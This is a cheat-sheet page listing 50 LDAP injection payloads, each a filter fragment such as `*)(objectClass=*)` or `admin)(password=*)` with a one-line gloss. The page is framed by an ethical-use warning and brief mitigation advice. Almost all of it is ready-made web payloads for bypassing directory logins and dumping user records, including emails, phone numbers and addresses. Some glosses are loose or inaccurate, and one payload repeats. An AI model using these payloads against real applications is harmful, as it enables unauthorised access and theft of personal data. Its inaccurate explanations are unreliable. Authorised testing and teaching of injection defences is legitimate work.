---
title: "LDAP injection payload"
tags:
  - LDAP_injection
---

LDAP (Lightweight Directory Access Protocol) injection is a technique used to exploit vulnerabilities in applications that construct LDAP queries from user input, similar to SQL or NoSQL injection but targeting LDAP directories like Active Directory or OpenLDAP. Below is a list of 50 example LDAP injection payloads designed to test for vulnerabilities. These payloads manipulate LDAP filters to bypass authentication, extract data, or alter query behavior.

**Warning**: These payloads are for educational and ethical testing purposes only, in controlled environments with explicit permission. Unauthorized use is illegal and unethical. Always test responsibly in a legal, authorized environment.

### LDAP Injection Payload Basics
LDAP queries often use filters in the format `(key=value)`, such as `(uid=user)(password=pass)`. Injection occurs when unsanitized user input is included in these filters. Payloads typically aim to:
- Bypass authentication (e.g., by making filters always true).
- Extract unauthorized data (e.g., by broadening search scopes).
- Exploit wildcard or logical operator behavior.

### LDAP Injection Payloads
The following payloads assume an LDAP query like `(uid=[user])(password=[pass])` or `(cn=[input])`. They are designed for common LDAP implementations (e.g., Active Directory, OpenLDAP). Adapt payloads based on the application’s query structure.

1. `admin)(objectClass=*)` - Closes the `uid` filter early and matches all objects.
2. `*)(objectClass=*)` - Matches all entries by appending a universal condition.
3. `admin)(|(objectClass=*))` - Uses OR to match any object after closing the filter.
4. `admin)(&(objectClass=*))` - Uses AND with a true condition to match all objects.
5. `*` - Wildcard to match any value for the attribute.
6. `admin*` - Matches usernames starting with "admin".
7. `*)(uid=*` - Attempts to match all user IDs by closing the filter.
8. `admin)(password=*)` - Bypasses password check by matching any password.
9. `admin)(!(objectClass=disabled))` - Excludes disabled accounts.
10. `admin)(|(uid=admin)(uid=user))` - OR condition to match multiple users.
11. `*)(cn=*)` - Matches all common names (cn) in the directory.
12. `admin)(&)` - Closes filter early with a true AND condition.
13. `admin)(|)` - Closes filter with a true OR condition.
14. `*)(givenName=*)` - Matches all entries with any given name.
15. `admin)(sAMAccountName=*)` - Targets Active Directory accounts.
16. `*)(mail=*)` - Matches all entries with any email address.
17. `admin)(userPassword=*)` - Matches any password for the user.
18. `*)(objectClass=user)` - Matches all user objects.
19. `admin)(!(cn=guest))` - Excludes specific users like "guest".
20. `*)(sn=*)` - Matches all entries with any surname.
21. `admin)(objectCategory=person)` - Matches person objects in Active Directory.
22. `*)(memberOf=*)` - Matches entries in any group.
23. `admin)(|(cn=admin)(cn=user))` - OR condition for multiple common names.
24. `*)(uidNumber=*)` - Matches all entries with any UID number.
25. `admin)(description=*)` - Matches entries with any description.
26. `*)(objectClass=group)` - Matches all group objects.
27. `admin)(!(password=wrong))` - Excludes specific passwords.
28. `*)(displayName=*)` - Matches all entries with any display name.
29. `admin)(|(objectClass=user)(objectClass=group))` - Matches users or groups.
30. `*)(homeDirectory=*)` - Matches entries with any home directory.
31. `admin)(&(uid=admin)(objectClass=*))` - Combines conditions to match admin.
32. `*)(telephoneNumber=*)` - Matches entries with any phone number.
33. `admin)(|(sAMAccountName=admin)(sAMAccountName=user))` - Active Directory OR condition.
34. `*)(gidNumber=*)` - Matches entries with any group ID number.
35. `admin)(!(objectClass=computer))` - Excludes computer objects.
36. `*)(title=*)` - Matches entries with any job title.
37. `admin)(|(mail=admin@*)(mail=user@*))` - Matches multiple email patterns.
38. `*)(objectClass=organizationalUnit)` - Matches organizational units.
39. `admin)(userAccountControl=512)` - Matches enabled Active Directory accounts.
40. `*)(department=*)` - Matches entries with any department.
41. `admin)(|(cn=*admin*)(cn=*user*))` - Wildcard match for common names.
42. `*)(postalCode=*)` - Matches entries with any postal code.
43. `admin)(!(sAMAccountName=guest))` - Excludes guest accounts in Active Directory.
44. `*)(objectClass=posixAccount)` - Matches POSIX account objects.
45. `admin)(|(objectCategory=person)(objectCategory=group))` - Matches people or groups.
46. `*)(company=*)` - Matches entries with any company name.
47. `admin)(password={MD5}*)` - Targets specific password hash formats.
48. `*)(streetAddress=*)` - Matches entries with any street address.
49. `admin)(|(uid=*)(cn=*))` - Matches any UID or CN.
50. `*)(objectClass=*)` - Matches all objects in the directory.

### Notes
- **Context-Specific**: Payloads depend on the LDAP schema (e.g., `uid` for OpenLDAP, `sAMAccountName` for Active Directory). Test the application’s attribute usage first.
- **Encoding**: For web applications, payloads may need URL encoding (e.g., `(` becomes `%28`).
- **Bypass Techniques**: Many payloads aim to make the filter always true (e.g., `objectClass=*`) or exclude invalid conditions (e.g., `!(cn=guest)`).
- **Ethical Use**: Only test systems you own or have explicit permission to test. Unauthorized testing is illegal.
- **Mitigation**: Developers should sanitize inputs, use parameterized LDAP queries, and validate user input to prevent injection. Avoid exposing LDAP filters to user input.

